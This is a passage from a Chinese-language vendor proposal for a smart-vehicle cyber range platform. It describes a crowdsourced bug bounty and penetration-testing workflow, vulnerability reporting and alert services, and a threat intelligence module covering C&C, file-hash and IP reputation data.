title="灵活的奖励机制："></a>灵活的奖励机制：</h4><p>平台提供自定义的漏洞奖励标准和漏洞奖励价格，支持企业自主控制测试范围（最低标准：高危1000中危300低危30）。100%效果付费，无漏洞不收费，消费透明；用户企业可自定义漏洞奖励标准与漏洞奖励价格，自主控制测试范围。采取漏洞奖金预充值的方式</p><p>平台允许根据特定项目的需求或复杂性，设定不同级别漏洞的奖励标准和价格。例如，对于高危漏洞，最低奖励标准为1000；对于中危漏洞，最低奖励标准为300；对于低危漏洞，最低奖励标准为30。</p><p>这种自定义奖励标准和价格的设置，有助于平台根据漏洞的严重性和影响程度，给予合理的奖励以激励白帽子提交高质量的漏洞报告。同时，这也为平台提供了更多灵活性，使其能够根据不同项目的需求设定合适的漏洞奖励政策。</p><h4 id="专业的漏洞报送经验："><a href="#专业的漏洞报送经验：" class="headerlink" title="专业的漏洞报送经验："></a>专业的漏洞报送经验：</h4><p>团队拥有丰富的漏洞报送经验，并具有漏洞信息报送突出贡献单位的认证。这些要求有助于确保报告的质量和可信度，我司提供了相关漏洞报送的专业性的证明材料。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/46544f187ee6b060bd352f5679885a03.png" alt="555c9907d8d665e9d210c17a27cb942"></p><h3 id="项目流程管理"><a href="#项目流程管理" class="headerlink" title="项目流程管理"></a>项目流程管理</h3><p>项目流程管理模块涵盖了以下关键功能和流程，以确保测试项目的有效进行：</p><p>测试范围明确：项目的测试范围包括车机系统网络层、主机系统层和业务应用层，覆盖了关键零部件的测试内容。这包括了汽车网络安全、业务安全实现等多方面的内容，以确保全面的安全测试。</p><p>完整的测试流程：测试项目的流程包括前期准备、账号分配、项目启动、漏洞确认、漏洞修复、漏洞回检和项目报告等多个环节，确保项目的有序推进和漏洞的及时处理。</p><p>项目前期明确：在项目前期，明确测试的范围、时间以及项目对接人。此外，还明确了测试工程中的监控策略和禁止行为，以确保测试的顺利进行。</p><p>项目发布：在SRC平台上发布测试项目，并按要求定向邀请白帽子参加测试。测试管理人员会分配用户专属账号。</p><p>测试监控和漏洞处理测试管理人员可以使用账号登录SRC平台，实时查看白帽子提交的漏洞详细信息和解决方案。漏洞处理包括审核、VPN账号分配等。</p><p>白帽子测试：白帽子确定后，开始为期等于两周的集中渗透测试。他们在测试过程中不断提交漏洞，平台漏洞审核人员会及时处理漏洞。</p><p>漏洞定级和修复方案：平台的漏洞专家会审核漏洞并提出详细的漏洞定级和修复方案。每个漏洞都会通过邮件和短信通知测试对接人。</p><p>漏洞修复：平台支持提供漏洞信息和修复方案，项目负责人可以及时修复漏洞。</p><p>整改建议和评估报告：基于整体综合风险评估的结果，平台会为用户提供减轻风险的安全建议和措施。评估报告包含了详尽的整改建议，具体全面地指导安全改进。</p><p>功能参数如下：</p><ul><li>测试范围包括车机系统网络层、主机系统层、业务应用层、涵盖关键零部件测试内容。不限于1、汽车网络安全，包含汽车网络本身设计是否合理，是否满足安全需求，是否设置了合适的安全策略，安全机制是否存在绕过的可能，是否能抵挡外部的攻击等。2、业务安全实现，包含业务是否正确的实现，开发中的错误，车载网络、系统、应用中的安全漏洞等。</li><li>测试流程包括前期准备、账号分配、项目启动、漏洞确认、漏洞修复、漏洞回检、项目报告等。</li><li>在项目前期明确范围和时间、项目对接人，明确测试工程中的监控策略和明令禁止的行为。</li><li>在SRC平台上发布测试项目，并按照要求定向邀请白帽子参加此次测试。同时也会给测试管理人员分配用户专属账号。</li><li>测试管理人员可用此账号登陆SRC平台，实时清晰地查看白帽子提交的漏洞详细信息以及对应的解决方案。</li><li>项目发布后，SRC平台会开始为期一周左右的向白帽子邀请，然后由平台运营人员进行审核、VPN账号分配、注意事项准备等事项。</li><li>白帽子确定后，开始为期不少于两周的集中渗透测试，测试过程中白帽子会不断提交漏洞，平台漏洞审核人员会及时地处理漏洞。</li><li>平台漏洞专家审核漏洞存在后，会立刻做出漏洞定级并提出专业详细的修复方案，每个漏洞都会通过邮件和短信的方式告知测试对接人。</li><li>平台支持提供漏洞信息及修复方案，支持项目负责人对漏洞进行及时修复。</li><li>依据整体综合风险评估的结果为用户提出削减风险的安全建议与措施，评估报告中包含合理的、可实施的、适度的、具体全面的整改建议。</li></ul><h4 id="广泛的测试范围："><a href="#广泛的测试范围：" class="headerlink" title="广泛的测试范围："></a>广泛的测试范围：</h4><p>SRC平台的测试范围涵盖了车机系统网络层、主机系统层以及业务应用层，包括关键零部件的测试内容。不限于1、汽车网络安全，包含汽车网络本身设计是否合理，是否满足安全需求，是否设置了合适的安全策略，安全机制是否存在绕过的可能，是否能抵挡外部的攻击等。2、业务安全实现，包含业务是否正确的实现，开发中的错误，车载网络、系统、应用中的安全漏洞等。</p><p>车机系统网络层：涉及汽车内部网络结构的安全性检测，包括网络通信协议、连接方式、数据传输的安全性等方面的测试。</p><p>主机系统层：对汽车主要控制系统的安全性进行评估，包括车辆控制单元（ECU）、操作系统、固件等的安全性检测。</p><p>业务应用层：针对车载应用程序的安全性进行检测，包括车载娱乐系统、导航系统等业务应用的漏洞测试。</p><p>关键零部件测试内容：针对汽车中的关键部件检测。</p><p>具体测试内容包括但不限于以下两个方面：</p><p>汽车网络安全：评估汽车网络设计的合理性，检测是否满足安全需求，查看是否存在安全策略缺失或安全机制绕过的可能性，并测试其抵御外部攻击的能力。</p><p>业务安全实现：检查汽车业务实现过程中的错误，评估车载网络、系统和应用中存在的安全漏洞，确保业务的正确实现和功能的安全性。</p><h4 id="清晰的测试流程："><a href="#清晰的测试流程：" class="headerlink" title="清晰的测试流程："></a>清晰的测试流程：</h4><p>项目的测试流程经过精心设计，包括前期准备、账号分配、项目启动、漏洞确认、漏洞修复、漏洞回检以及项目报告等多个阶段。这些流程的定义和执行确保了测试项目的有序进行，漏洞的及时处理以及最终的项目报告准备。</p><p>测试流程包括以下步骤：</p><p>前期准备：确定测试范围、目标和相关约束条件，收集所需资料和准备测试环境。</p><p>账号分配：为参与测试的相关人员分配必要的账号和权限，确保他们能够进行测试所需的操作。</p><p>项目启动：正式启动测试项目，通知相关团队和人员，确保测试的顺利展开。</p><p>漏洞确认：测试人员开始执行测试，发现潜在漏洞，并进行初步确认，验证其真实性和严重性。</p><p>漏洞修复：报告确认后，通知相关团队进行漏洞修复，解决已确认的漏洞问题。</p><p>漏洞回检：修复漏洞后，再次进行测试确认，确保漏洞已被完全修复，不再存在安全问题。</p><p>项目报告：整理测试结果，编制项目报告，详细记录测试过程、发现的漏洞以及修复情况，并提出后续改进建议。</p><h4 id="项目前期准备："><a href="#项目前期准备：" class="headerlink" title="项目前期准备："></a>项目前期准备：</h4><p>在项目开始之前，我们将明确项目的范围、时间、项目对接人，并定义测试工程中的监控策略和禁止行为，以确保测试的有序进行。</p><p>在项目前期，明确定义以下几个方面：</p><p>范围和时间: 确定测试的范围、持续时间和期望达到的目标。明确规定测试将涉及的系统、应用或网络范围，以及测试的开始和结束时间。</p><p>项目对接人: 指定项目的主要对接人员，负责协调和管理测试流程。这些人员应该负责与测试团队沟通、解决问题和提供支持。</p><p>监控策略: 明确测试工程中的监控策略，包括对系统、网络或应用的实时监控措施。确保能够及时发现和应对可能出现的异常情况。</p><p>禁止行为: 明令禁止的行为，包括不允许的测试范围、操作、攻击手段等。明确规定哪些行为属于禁止范围，以及不允许对系统造成影响或损害的操作。</p><h4 id="项目发布与白帽子邀请："><a href="#项目发布与白帽子邀请：" class="headerlink" title="项目发布与白帽子邀请："></a>项目发布与白帽子邀请：</h4><p>我们在SRC平台上发布测试项目，并按照要求定向邀请合适的白帽子参加测试。同时，我们也为测试管理人员分配了用户专属账号，以便他们实时监控项目的进展。</p><p>在SRC平台上发布测试项目是为了利用白帽子的技能和专业知识对特定系统或网络进行安全测试。这一过程涉及项目的详细描述，包括测试的范围、目标以及预期的结果。定向邀请白帽子参与测试是为了确保只有经过筛选和认可的专业人士可以参与，以确保测试的高质量和有效性。同时，为测试管理人员分配专属账号是为了确保对测试项目的管理和监督，这些账号通常具有特殊权限，允许管理人员跟踪进展、审查结果并与参与者进行沟通。通过这种方式，在SRC平台上发布测试项目并邀请白帽子参与，可以实现对系统或网络安全的全面评估和改进，确保其安全性和稳健性。</p><h4 id="测试管理人员查看白帽子提交的解决方案："><a href="#测试管理人员查看白帽子提交的解决方案：" class="headerlink" title="测试管理人员查看白帽子提交的解决方案："></a>测试管理人员查看白帽子提交的解决方案：</h4><p>我方系统支持测试管理人员使用专属账号登录SRC平台，可以实时清晰地查看白帽子提交的漏洞详细信息和对应的解决方案。</p><p>测试管理人员可以使用其账号登录SRC平台，通过该平台实时、清晰地查看白帽子提交的漏洞详细信息以及相应的解决方案。该功能允许测试管理人员获取漏洞报告的所有相关信息，包括漏洞的描述、影响范围、危害级别等详细内容。此外，他们还能够查看相应的解决方案或建议，包括针对漏洞的修复措施、建议的安全补丁或其他措施。</p><p>通过SRC平台，测试管理人员能够对漏洞进行全面的审查和评估，了解漏洞的严重程度，并快速获取解决方案以便进行相应的修复工作。这种实时、清晰的查看方式有助于管理人员更加高效地组织漏洞修复工作、提高响应速度，确保系统安全和稳定性。同时，也为测试管理人员提供了更直观、全面的数据和信息，以便他们能够更好地管理漏洞修复流程，从而确保系统的持续安全运行。</p><h4 id="集中渗透测试："><a href="#集中渗透测试：" class="headerlink" title="集中渗透测试："></a>集中渗透测试：</h4><p>一旦项目发布后，SRC平台会开始为期一周左右的白帽子邀请，然后由平台运营人员进行审核、VPN账号分配以及其他必要的准备工作。随后，白帽子开始为期等于两周的集中渗透测试。在测试过程中，他们会不断提交发现的漏洞，而平台漏洞审核人员将会及时处理这些漏洞。</p><p>测试管理人员获得的专属账号赋予了他们在SRC平台上特殊的权限，使其能够实时、清晰地查看白帽子提交的漏洞详细信息和相应的解决方案。通过这个账号，管理人员可以直接登录SRC平台并访问有关测试项目的相关页面。他们可以深入了解每个提交的漏洞报告，包括漏洞的描述、可能的影响、触发条件以及漏洞利用的步骤或证明。此外，对应的解决方案也将被提供，这些方案包括修复建议或其他必要的措施来解决发现的漏洞。</p><p>管理人员可以利用这些信息来评估漏洞的严重性和优先级，并采取相应的措施。他们可以与相关团队或系统负责人合作，制定和实施解决方案，以修复或缓解这些安全漏洞。这种实时查看漏洞报告并获取解决方案的能力，使得管理人员可以快速响应并处理系统或网络中发现的安全问题，从而有效地提高系统的安全性和稳定性。</p><h4 id="漏洞审核与修复："><a href="#漏洞审核与修复：" class="headerlink" title="漏洞审核与修复："></a>漏洞审核与修复：</h4><p>SRC平台的漏洞专家会审核并定级漏洞，并提供专业详细的修复方案。每个漏洞都会通过邮件和短信的方式告知测试对接人，以便及时修复。</p><p>一旦白帽子确认参与测试，测试过程就会开始，通常持续不少于两周的集中渗透测试。在这段时间里，白帽子会专注于系统或网络的安全性，并不断提交他们发现的漏洞和安全漏洞报告。这些报告会通过SRC平台提交，进入漏洞审核流程。</p><p>平台上的漏洞审核人员在白帽子提交漏洞报告后会迅速介入，并进行审核和评估。他们会仔细检查每个漏洞报告，验证其真实性、严重性和可复现性。审核人员会尽快处理漏洞，可能会联系相关团队或系统负责人确认漏洞，并协助制定解决方案。同时，他们会及时更新漏洞的状态和处理进展，确保透明度和及时性。</p><p>这种快速响应和及时处理漏洞的流程，有助于最大限度地减少系统或网络受到的潜在威胁。通过白帽子的持续渗透测试和漏洞审核人员的迅速处理，系统的安全性得以不断评估和提升，使得潜在的安全风险得到及时管理和解决。</p><h4 id="漏洞信息共享："><a href="#漏洞信息共享：" class="headerlink" title="漏洞信息共享："></a>漏洞信息共享：</h4><p>平台支持提供漏洞信息及修复方案，并支持项目负责人对漏洞进行及时修复，以确保漏洞不会被滥用或进一步恶化。</p><p>一旦平台漏洞专家确认了存在的漏洞，他们会立即对漏洞进行定级，评估其严重性和影响，并提出专业详细的修复方案。这些修复方案可能包括详细的技术指导、修补程序或建议的安全改进措施，旨在解决漏洞并加强系统或网络的安全性。</p><p>每个漏洞都会通过邮件和短信等方式通知测试对接人。这种通知方式可以确保测试对接人能够及时了解漏洞的存在和相关修复方案。这样的沟通方式有助于加快漏洞修复的速度，并使测试对接人能够及时将修复方案传达给相关团队或系统负责人，以便迅速采取行动修复漏洞。</p><p>通过快速定级和提供专业详细的修复方案，并通过多种方式通知相关人员，可以确保漏洞得到及时且有效地处理。这种协作和沟通机制有助于最大程度地降低系统或网络受到漏洞威胁的风险，同时提高了对系统安全性的持续关注和改进。</p><h4 id="综合风险评估："><a href="#综合风险评估：" class="headerlink" title="综合风险评估："></a>综合风险评估：</h4><p>根据整体综合风险评估的结果，我们将为用户提供削减风险的安全建议与措施。评估报告中包含了合理、可实施、具体全面的整改建议，帮助用户改进其安全体系，降低潜在风险。</p><p>依据整体综合风险评估的结果，安全专家会为用户提出削减风险的安全建议与措施。这些安全建议旨在通过详尽的评估报告，包含合理、可实施、适度、具体和全面的整改建议，来降低系统或网络所面临的潜在风险。</p><p>报告中的建议涉及多个层面，包括技术、策略和流程方面。针对发现的各类漏洞和风险，安全专家会提出相应的解决方案。这些解决方案涉及更新软件补丁、加强身份验证措施、改进访问控制，或者提供员工安全意识培训等措施。</p><p>这些建议根据漏洞和风险的严重性和优先级排序，并提供详细说明以确保易于理解和实施。整改建议的全面性和具体性有助于用户了解安全漏洞的性质和影响，以及采取措施加强安全性的紧迫性。通过执行这些建议，用户能够逐步降低系统或网络面临的潜在风险，提升整体的安全水平。</p><h3 id="平台对接"><a href="#平台对接" class="headerlink" title="平台对接"></a>平台对接</h3><p>平台对接模块提供了以下关键功能，以确保用户能够有效地与平台进行互动和协作：</p><p>测试资源申请：用户可以通过平台提交测试资源申请，包括建立VPN、内网通道、提供测试环境等功能，以便进行安全测试。</p><p>漏洞上报：平台支持用户将发现的漏洞直接上报，这些漏洞会被推送到漏洞管理平台进行进一步处理和管理。</p><p>功能参数如下：</p><ul><li>通过靶场响应用户的测试资源申请，包括建立VPN、内网通道、提供测试环境、回收资源等功能。</li><li>提供漏洞上报，将用户提交的漏洞推送到漏洞管理平台。</li><li>通过漏洞平台提供的接口，跟踪漏洞的审核认定状态。</li><li>与安全运营平台对接，实现漏洞的关联分析。</li></ul><h5 id="提供测试资源支持："><a href="#提供测试资源支持：" class="headerlink" title="提供测试资源支持："></a>提供测试资源支持：</h5><p>我们的平台可以灵活响应用户的测试资源申请，包括但不限于建立VPN通道、内网通信通道、提供测试环境等多种功能。这确保了用户能够获得所需的资源以顺利进行安全测试。</p><p>靶场平台通常会响应用户的测试资源申请，以便于用户能够进行安全测试和评估。这些资源包括但不限于建立VPN（虚拟专用网络）、提供内网通道、搭建测试环境以及在测试完成后回收资源等功能。</p><p>建立VPN和提供内网通道是为了使用户能够安全地远程访问被测试系统或网络，确保他们可以进行安全评估和渗透测试。这种远程访问的方式允许用户在一个受控环境下进行测试，而不会影响生产系统或网络。</p><p>平台也会为用户提供所需的测试环境，包括搭建模拟的系统、网络或应用程序，以便用户进行各种安全测试，如漏洞扫描、渗透测试等。测试环境通常是在隔离的区域内创建，以防止对生产环境造成潜在风险。</p><p>最后，在测试完成后，靶场平台会及时回收用户所使用的资源，确保安全性和资源的合理利用。这个回收资源的过程有助于维持平台的稳定性和安全性。</p><p>通过这些功能和服务，靶场平台能够有效地支持用户进行安全测试活动，提供必要的测试环境和资源，同时确保测试的安全性和可控性。</p><h4 id="漏洞上报和推送："><a href="#漏洞上报和推送：" class="headerlink" title="漏洞上报和推送："></a>漏洞上报和推送：</h4><p>我们提供了漏洞上报功能，让用户能够提交所发现的漏洞。一旦用户提交漏洞，我们会将这些漏洞信息推送到漏洞管理平台，以便后续的审核和处理。</p><p>这个过程涉及以下步骤：</p><p>接收漏洞报告： 平台会提供一个界面，供用户提交他们发现的漏洞。这包括漏洞的详细描述、漏洞利用的步骤、漏洞影响范围以及可能的解决方案。</p><p>漏洞验证与处理： 平台的安全团队或相关专家会对接收到的漏洞报告进行验证和评估。他们会确认漏洞的真实性和严重性，并可能重现漏洞来确认其有效性。</p><p>推送至漏洞管理平台： 一旦漏洞被验证并确认，平台会将这些信息推送至漏洞管理平台。</p><h4 id="漏洞状态跟踪："><a href="#漏洞状态跟踪：" class="headerlink" title="漏洞状态跟踪："></a>漏洞状态跟踪：</h4><p>通过漏洞管理平台提供的接口，我们能够帮助用户跟踪漏洞的审核认定状态。这意味着用户可以随时了解漏洞的处理进展，确保漏洞得到及时处理和解决。</p><p>通过漏洞平台提供的接口，用户可以跟踪漏洞的审核认定状态。这个接口会提供漏洞的实时信息，包括漏洞报告的审核状态、处理进展以及最新的更新。</p><p>使用这个接口，用户可以随时查询漏洞的审核状态，例如漏洞是否已被确认、正在审核中、已得到解决或正在进行修复等。这些信息能够帮助用户了解漏洞报告的处理进展，以及安全团队对漏洞的认定程度。</p><p>漏洞平台提供的接口还包括其他相关信息，比如漏洞的详细描述、严重性评级、提供报告的白帽子的信息等。这些信息的及时更新和提供，有助于用户全面了解漏洞的情况和处理进程，从而更好地管理漏洞的修复和处理过程。</p><h4 id="漏洞关联分析："><a href="#漏洞关联分析：" class="headerlink" title="漏洞关联分析："></a>漏洞关联分析：</h4><p>平台与安全运营平台对接，实现漏洞关联分析。</p><p>漏洞数据整合： 将漏洞平台收集到的漏洞数据与安全运营平台中的其他安全数据（如日志、事件数据等）进行整合。这使得安全运营团队可以在一个统一的界面或系统中查看综合的安全信息。</p><p>关联分析： 结合漏洞数据和其他安全数据，进行关联分析和检测。通过将漏洞数据与可能的攻击模式、异常行为或已知的威胁情报进行关联，有助于发现潜在的安全威胁并及时采取措施进行防范。</p><h2 id="项目售后管理"><a href="#项目售后管理" class="headerlink" title="项目售后管理"></a>项目售后管理</h2><p>项目售后管理模块包括：</p><p>漏洞威胁情报服务：我方在项目验收后，会向客户提供相应的漏洞威胁情报服务。这包括定期提供漏洞信息、预警服务，以帮助客户及时了解潜在的安全威胁和漏洞情况。</p><p>业界漏洞告警：我方会不定期通过邮件等方式向客户推送业界重大漏洞告警信息，包括补丁信息、漏洞态势、漏洞研究报告、国际事件处理资讯等，以帮助客户保持对最新漏洞和安全事件的了解。</p><p>功能参数如下：</p><ul><li>我司平台验收后，向客户提供相应的漏洞威胁情报及预警服务。</li><li>我司提供不定期通过邮件推送业界重大漏洞告警及补丁信息、重大舆情信息、漏洞态势、各行业漏洞研究报告、国际重大事件处理资讯等告警服务。</li></ul><h3 id="漏洞威胁情报及预警服务："><a href="#漏洞威胁情报及预警服务：" class="headerlink" title="漏洞威胁情报及预警服务："></a>漏洞威胁情报及预警服务：</h3><p>在我方的平台验收完成后，我们会向用户提供全面的漏洞威胁情报和预警服务。这包括但不限于漏洞信息、威胁情报、安全事件的实时监测和分析，以帮助用户保持对潜在威胁的高度警惕。</p><p>我方平台会向客户通报最新的漏洞信息，并提供相应的修复建议。这种通报通常包括漏洞的描述、可能的影响程度以及针对漏洞的修复方案，帮助客户快速了解并解决可能存在的安全问题。提供针对特定安全问题的定制化建议和指导，帮助客户制定更健壮的安全策略和措施。这包括对安全漏洞的解释、建议的安全改进措施等，以提高整体的安全性。</p><h3 id="重大漏洞告警及补丁信息："><a href="#重大漏洞告警及补丁信息：" class="headerlink" title="重大漏洞告警及补丁信息："></a>重大漏洞告警及补丁信息：</h3><p>为了确保用户始终了解安全风险，我们提供不定期的邮件推送服务，将业界重大漏洞告警、最新补丁信息、重要的舆情信息、漏洞态势分析、各行业漏洞研究报告以及国际重大事件处理资讯等内容直接送达客户邮箱。这有助于用户及时采取必要的安全措施以应对新的威胁。</p><p>我方会向客户提供关于业界最新的重大漏洞信息和相应的补丁信息。这包括漏洞的详细描述、可能的影响、已知的攻击方式以及供应商发布的修复补丁，帮助客户及时采取措施修复漏洞。</p><p>我方提供关于漏洞态势的分析和不同行业漏洞研究报告。这些报告包括对漏洞趋势的分析、不同行业受影响的漏洞类型等信息，帮助客户更好地了解当前漏洞形势。</p><h1 id="智能汽车网络靶场威胁情报平台"><a href="#智能汽车网络靶场威胁情报平台" class="headerlink" title="智能汽车网络靶场威胁情报平台"></a>智能汽车网络靶场威胁情报平台</h1><h2 id="总体概述-2"><a href="#总体概述-2" class="headerlink" title="总体概述"></a>总体概述</h2><p>我司的威胁情报平台旨在提供威胁情报中心所需的安全运营后的威胁情报数据服务。包括以下主要特点：</p><p>提供多种威胁情报数据类型，包括失陷检测类情报、IP信誉情报、文件信誉情报、漏洞情报、APT档案库。</p><p>拥有数亿条海量热点库数据，并提供本地API接口集成，方便快速获取和使用数据。</p><p>具备多源情报汇聚能力，能够从不同来源收集和整合威胁情报数据。</p><p>可与领先的安全大数据平台（如SOC、SIEM、SPLUNK、ELK等）进行接口集成，实现威胁发现和网络安全事件检测。</p><p>能够协助用户开展APT攻击、恶意软件、钓鱼网站等网络安全事件的处理和分析。</p><p>评估网络安全事件的整体危害，并提供溯源攻击者的追踪和分析功能。</p><p>提升汽车安全运营平台的整体安全能力，保障汽车系统的安全运行。</p><p>功能参数如下：</p><ul><li>情报数据服务：数据加工和数据应用，数据加工是指将数据源的数据进行清洗、整理，而数据应用是将整理后的数据赋予行业属性，使其能直接为企业客户提供帮助。情报数据内容包括：样本数据、DNS数据、URL数据等，此外还有第三方数据。</li><li>威胁研判分析：威胁情报平台提供域名、IP、邮箱、文件HASH、证书指纹或其它字符串等内容进行判定和报警，了解其真实性、攻击团伙/软件的意图与能力，进而可以有效地快速筛选出真实、重要的报警，可根据报警的内容协助分析研判。</li><li>情报多源聚合与管理：威胁情报平台提供了多维度、多类型的情报多源接入聚合功能，并能够针对接入的情报源进行有效管理，弥补单一情报覆盖不足等情况。</li><li>漏洞情报：漏洞情报包括应用层漏洞、系统漏洞（包括Linux、安卓、QNX等）、中间件漏洞、车载通信协议漏洞（不限于WiFi、蓝牙、蜂窝网络、以太网等相关协议漏洞情报）（补充车的，通信协议漏洞、芯片）</li><li>APT档案库：平台提供APT档案库信息，各类详细信息构成了APT团伙攻击背景画像，在收集到攻击事件告警后，根据特征和关联分析结果与APT档案库进行比对，命中APT攻击团伙。</li><li>安全通告：威胁情报平台具备并体用全面、多维度的安全通告。</li><li>情报运营分析：威胁情报平台可以提供全面的数据情报运营分析能力，为运营平台的安全决策提供辅助数据支撑。</li></ul><h2 id="失陷检测情报"><a href="#失陷检测情报" class="headerlink" title="失陷检测情报"></a>失陷检测情报</h2><p>威胁情报中心可以提供有关攻击者的远程命令与控制服务器情报，用于发现被APT组织、僵尸网络、木马软件、后门工具等控制的失陷主机。这些情报将被推送到威胁情报平台，方便情报信息的查找。</p><p>功能参数如下：</p><ul><li>有关攻击者的远程命令与控制服务器情报，用以发现内部被APT组织、僵尸网络、木马软件、后门工具等控制的失陷主机。此类情报将推送到威胁情报平台，以保障高速查询的需要。</li></ul><h3 id="失陷检测情报功能说明"><a href="#失陷检测情报功能说明" class="headerlink" title="失陷检测情报功能说明"></a>失陷检测情报功能说明</h3><p>威胁情报中心（Threat Intelligence Center）是一个专门负责收集、分析和提供有关威胁情报的组织或部门。它的主要目标是帮助组织识别和应对各种网络安全威胁，包括攻击者的远程命令与控制服务器（C&amp;C Server）情报。</p><p>远程命令与控制服务器是攻击者用来控制被攻陷的主机或网络的服务器。攻击者通过C&amp;C服务器发送指令，控制受感染的主机执行各种恶意活动，例如传输数据、发起攻击、窃取敏感信息等。威胁情报中心通过收集和分析与C&amp;C服务器相关的信息，提供有关这些服务器的情报。</p><p>我司失陷威胁情报的功能包括：</p><h4 id="收集情报"><a href="#收集情报" class="headerlink" title="收集情报"></a>收集情报</h4><p>通过监测网络流量、分析恶意软件样本、参与安全事件响应等方式，收集与C&amp;C服务器相关的情报。这些情报可以包括C&amp;C服务器的IP地址、域名、通信协议、指令和控制机制等。并且确保收集和共享情报的合规性，遵循相关法规和隐私政策。对于敏感信息，确保进行适当的脱敏或匿名化处理。</p><h4 id="分析情报"><a href="#分析情报" class="headerlink" title="分析情报"></a>分析情报</h4><p>对收集到的情报进行深入分析和研究，以了解攻击者的行为模式、技术手段和攻击策略。通过分析C&amp;C服务器的特征和行为，可以发现被APT组织、僵尸网络、木马软件、后门工具等控制的失陷主机。</p><h4 id="推送情报"><a href="#推送情报" class="headerlink" title="推送情报"></a>推送情报</h4><p>将分析得到的情报推送到威胁情报平台，使其他安全团队和系统能够访问和利用这些情报。失陷检测威胁情报平台可以是一个集中的信息共享平台，帮助各个组织共享和获取最新的威胁情报，以便更好地保护自身网络安全。</p><h2 id="文件信誉情报"><a href="#文件信誉情报" class="headerlink" title="文件信誉情报"></a>文件信誉情报</h2><p>利用云端丰富的样本资源，并采用多种技术方式进行分析，以判断文件是否恶意以及具体的类型和家族等信息。我们使用文件的哈希值作为索引，包括判断文件是否为白文件、是否恶意、恶意类型、家族信息等。针对已知的木马、蠕虫、恶意软件、黑客工具、APT样本，我们还可以提供相应哈希样本的网络IOC信息。在本地维护一个缓存库，对样本信誉数据进行存储，如果数据未命中，则会向云端查询。云端库拥有百亿条以上的数据。</p><p>功能参数如下：</p><ul><li>文件信誉情报利用云端丰富的样本资源，采用多种技术方式进行分析，判断文件是否恶意以及具体的类型和家族等信息。</li><li>以文件的HASH为索引，包括是否是白文件、是否恶意、恶意类型、家族信息等信息，针对已知木马、蠕虫、恶意软件、黑客工具、APT样本，同时可以提供对应hash样本的网络IOC信息。</li><li>样本信誉数据将在本地维护一个Cache库，不能命中的数据再到云端查询，云端库大于百亿条以上。</li></ul><p>提供异步查询的支持，允许用户提交查询请求后继续进行其他操作，而不必等待查询结果返回。系统将为每个查询分配一个唯一的标识符或任务ID，用户可以稍后使用该标识符来检索查询结果。这种功能对于大规模查询或需要较长处理时间的情况尤其有用，能够提高系统的响应性和用户体验。</p><h3 id="文件信誉情报功能说明"><a href="#文件信誉情报功能说明" class="headerlink" title="文件信誉情报功能说明"></a>文件信誉情报功能说明</h3><h4 id="云端样本资源"><a href="#云端样本资源" class="headerlink" title="云端样本资源"></a>云端样本资源</h4><p>利用云端存储的样本资源进行文件分析。可以从云端访问大量的样本文件，这些样本文件可以是已知的恶意文件、黑客工具、APT样本等。云端样本资源的优势在于可以集中存储、共享和更新样本文件，以提供更准确和实时的分析结果。</p><p>为了确定文件的恶意性和具体信息，文件信誉情报采用多种技术方式进行分析。这些技术方式可能包括静态分析、动态分析、行为分析等。通过综合应用这些技术，可以获取关于文件的详细信息，如恶意代码、行为特征、攻击方式等。</p><h4 id="文件哈希值作为索引"><a href="#文件哈希值作为索引" class="headerlink" title="文件哈希值作为索引"></a>文件哈希值作为索引</h4><p>使用文件的哈希值作为索引来标识和查询文件。哈希值是通过对文件内容进行哈希算法计算而得到的唯一标识符。通过对文件进行哈希计算，可以快速检索和比对已知的哈希值数据库，以确定文件是否已经被分析过、是否为白文件或已知的恶意文件。</p><h4 id="缓存库和云端库"><a href="#缓存库和云端库" class="headerlink" title="缓存库和云端库"></a>缓存库和云端库</h4><p>在本地维护一个缓存（cache）库，用于存储样本信誉数据。对于已经分析过的文件，可以在本地进行快速查询，而无需每次都向云端发送请求。如果本地缓存库中未找到相关数据，系统将向云端查询，云端库中拥有百亿条以上的数据，可以提供更全面的信息。</p><h4 id="网络IOC信息"><a href="#网络IOC信息" class="headerlink" title="网络IOC信息"></a>网络IOC信息</h4><p>对于已知的木马、蠕虫、恶意软件、黑客工具、APT样本，系统可以提供相应哈希样本的网络IOC（Indicator of Compromise）信息。网络IOC是指表明系统已受到攻击或可能受到攻击的特征或指标。通过提供网络IOC信息，可以帮助其他用户或系统识别并防范已知的恶意活动。</p><h4 id="支持异步查询"><a href="#支持异步查询" class="headerlink" title="支持异步查询"></a>支持异步查询</h4><p>异步查询支持有助于提高系统的效率和可用性，特别是在处理大规模数据或需要复杂计算的情况下。用户可以提交查询请求后立即进行其他操作，而不必等待查询完成。系统会在后台处理查询任务，并在完成后提供结果或任务完成的通知。这种设计使得系统更具弹性，能够更好地处理并发请求，提高了用户体验和系统的整体性能。</p><h2 id="IP信誉情报"><a href="#IP信誉情报" class="headerlink" title="IP信誉情报"></a>IP信誉情报</h2><p>支持互联网攻击IP地址的情报信息，可以判断该IP地址是否有历史攻击行为、是否为IDC主机、是否为傀儡主机、是否为代理或Tor网主机、是否可能是扫描机器人等。</p><p>功能参数：</p><ul><li>支持来自互联网攻击IP地址的情报信息，内部应支持是否有历史攻击行为、是否为IDC主机、是否是傀儡主机、是否是代理或Tor网主机、是否可能是扫描机器人等。</li></ul><h3 id="IP信誉情报功能说明"><a href="#IP信誉情报功能说明" class="headerlink" title="IP信誉情报功能说明"></a>IP信誉情报功能说明</h3><h4 id="历史攻击行为分析"><a href="#历史攻击行为分析" class="headerlink" title="历史攻击行为分析"></a>历史攻击行为分析</h4><p>威胁情报中心可以维护一个数据库，记录已知的攻击IP地址和相关的攻击行为历史。通过查询这个数据库，可以了解到该IP地址是否有过历史攻击行为，以及攻击的类型和频率等信息。</p><p>具备具有地理位置和网络行为关联分析功能分析互联网攻击IP地址的地理位置与网络行为之间的关联。通过结合地理位置信息和网络活动模式，系统可以判断某个IP地址的行为是否与其地理位置相符，以及是否存在异常行为。</p><h4 id="所属分析"><a href="#所属分析" class="headerlink" title="所属分析"></a>所属分析</h4><p>IDC主机：IDC（Internet Data Center）主机通常由互联网服务提供商（ISP）或数据中心运营商提供。威胁情报中心可以通过IP地址的归属信息来判断该IP地址是否为IDC主机。IDC主机可能被黑客用作攻击来源或代理服务器。</p><p>傀儡主机：傀儡主机是指被黑客控制并用于发起攻击的合法主机。威胁情报中心可能会收集和分析与傀儡主机相关的信息，例如与傀儡主机通信的恶意命令和控制服务器（C&amp;C Server）等，以帮助识别傀儡主机。</p><p>代理或Tor网络主机：代理服务器和Tor网络（The Onion 